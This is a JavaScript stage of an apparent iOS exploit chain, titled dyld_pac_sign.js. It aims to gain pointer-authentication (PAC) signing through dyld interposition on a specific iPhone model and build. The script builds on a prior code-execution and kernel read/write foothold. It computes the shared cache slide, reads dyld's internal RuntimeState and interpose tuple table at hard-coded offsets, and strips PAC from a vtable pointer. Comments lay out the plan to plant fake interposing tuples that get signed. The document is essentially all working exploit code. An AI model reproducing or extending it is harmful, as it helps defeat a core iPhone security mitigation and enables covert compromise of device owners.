// dyld_pac_sign.js — Get PAC signing capability via dyld interposition
//
// Strategy:
// 1. Find shared cache slide from a known symbol
// 2. Read libdyld__gAPIs to find dyld RuntimeState
// 3. Write fake interposing tuples that include dyld::signPointer
// 4. Trigger dlopen() to make dyld process our tuples and PAC-sign them
// 5. Read back PAC-signed signPointer from the function pointer table

log('=== Dyld PAC Signing Setup ===');

// Step 1: Compute shared cache slide
// dlsym is at a known unslid address in the offset table
// We can resolve dlsym via callSymbol and compare
var dlsym_resolved = callSymbol('dlsym', '0xfffffffffffffffe', umalloc(1)); // RTLD_DEFAULT, dummy
// Actually we need the address of dlsym itself, not a symbol resolved by it
// Let's use a different approach: find libdyld__gAPIs via kernel R/W

// The unslid address of libdyld__gAPIs for iPhone17,4_22G86:
var UNSLID_libdyld_gAPIs = '0x1ed3d0000';
// We need the shared cache slide to compute the slid address

// We can get the slide from the kernel's known slide value
// Our kernel slide = kernelSlide, but shared cache slide is DIFFERENT
// Let me find it by looking at a known function address

// pthread_create is at a known location. We found it in the RCE:
// pthread_create_got: 0x1fd9b69c0 (unslid shared cache address)
// At runtime it resolves to: slide + 0x1fd9b69c0
// But we can also just look at _dyld_get_shared_cache_range or similar

// Simplest: use callSymbol to get address of a known function
var mallocBuf = umalloc(64);
uwrite_str(mallocBuf, 'malloc');
var mallocAddr = callSymbol('dlsym', '0xfffffffffffffffe', mallocBuf);
ufree(mallocBuf);
log('malloc runtime addr: ' + mallocAddr);

// malloc unslid for iPhone17,4_22G86 from offset table:
// Need to find it... let me use libdyld__gAPIs directly
// The key: libdyld__gAPIs is a GLOBAL VARIABLE in the shared cache
// Its address = unslid + shared_cache_slide

// We can find the shared cache slide via _dyld_get_image_slide
// or from the kernel: dyld_shared_cache_slide is computed in sbx1

// Actually, the simplest way: read the __DATA segment of libdyld
// at the known unslid offset + slide. We need to find the slide first.

// Use callSymbol to call _dyld_get_all_image_infos or similar
var ptrBuf = umalloc(8);
// _dyld_get_shared_cache_range gives us the cache base
var rangeBuf = umalloc(16);
var cacheBase = callSymbol('_dyld_get_shared_cache_range', rangeBuf);
log('shared cache base: ' + cacheBase);
var cacheLen = uread64(rangeBuf);
log('shared cache length: ' + cacheLen);
ufree(rangeBuf);

// The unslid shared cache base is typically 0x180000000 on arm64e iOS
// Slide = runtime_base - 0x180000000
var UNSLID_CACHE_BASE = '0x180000000';
var sc_slide = sub(cacheBase, UNSLID_CACHE_BASE);
log('shared cache slide: ' + sc_slide);

// Now compute the slid libdyld__gAPIs
var libdyld_gAPIs = add(UNSLID_libdyld_gAPIs, sc_slide);
log('libdyld__gAPIs (slid): ' + libdyld_gAPIs);

// Step 2: Read RuntimeState from gAPIs
// gAPIs is a pointer to RuntimeState
// But this is in USERSPACE shared cache, not kernel memory
// We need to read it from our own process memory, not kernel memory!
// callSymbol can dereference it by calling a function that reads from that address
// Or: since we have kernel R/W, we can read our own process memory too
// Actually kernel R/W reads KERNEL virtual addresses, not userspace
// We need USERSPACE reads — use uread64

// BUT: uread64 reads from userspace memory at the given address
// libdyld__gAPIs is a userspace shared cache address
var runtimeState = uread64(libdyld_gAPIs);
log('RuntimeState: ' + runtimeState);

if (runtimeState == '0x0' || runtimeState == 'ERROR: invalid address') {
  log('[-] Failed to read RuntimeState');
  log('[-] libdyld__gAPIs may be at wrong address');
  log('[-] Check: shared cache slide = ' + sc_slide);
} else {
  log('[+] RuntimeState found!');

  // Step 3: Read InterposeTupleAll from RuntimeState
  // runtimeState + 0xb8 = p_InterposeTupleAll_buffer
  // runtimeState + 0xc0 = p_InterposeTupleAll_size
  var tuplesBufPtr = add(runtimeState, '0xb8');
  var tuplesSizePtr = add(runtimeState, '0xc0');
  var currentTuplesBuf = uread64(tuplesBufPtr);
  var currentTuplesSize = uread64(tuplesSizePtr);
  log('InterposeTupleAll buffer: ' + currentTuplesBuf);
  log('InterposeTupleAll size: ' + currentTuplesSize);

  // Step 4: Read RuntimeState vtable and compute dyld offset
  var runtimeState_vtable_raw = uread64(runtimeState);
  log('RuntimeState vtable (raw/PAC): ' + runtimeState_vtable_raw);
  // Strip PAC for comparison (userspace PAC → mask lower bits)
  // On arm64e userspace, PAC is in top bits. noPAC = addr & 0x7fffffffff
  var vtable = band(runtimeState_vtable_raw, '0x7fffffffff');
  log('RuntimeState vtable (stripped): ' + vtable);

  var UNSLID_vtable = '0x1f268ffb0'; // from offset table
  var dyld_offset = sub(add(UNSLID_vtable, sc_slide), vtable);
  log('dyld offset: ' + dyld_offset);
}

'step1_complete';
